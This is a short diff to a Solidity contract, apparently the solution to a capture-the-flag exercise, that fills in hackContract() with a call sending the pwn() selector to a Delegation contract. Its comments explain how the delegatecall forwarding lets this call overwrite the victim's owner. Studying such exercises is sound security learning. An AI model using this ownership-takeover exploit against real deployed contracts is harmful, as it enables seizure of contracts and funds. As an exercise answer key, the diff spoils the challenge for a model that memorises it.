@@ -10,6 +10,12 @@ contract AttackingDelegation {
     }
 
     function hackContract() external {
-        // Code me!
+        // Regular delegatecall explotation.
+        // AttackingDelegation calls Victim (Delegation) which forwards the
+        // call to Delegate using delegatecall.
+        // msg.data contains the signature of function pwn() which ends up
+        // executed in Delegate contract using Delegation context.
+        // We end up modifying the owner of Delegation.
+        address(contractAddress).call(abi.encodeWithSignature("pwn()"));
     }
 }
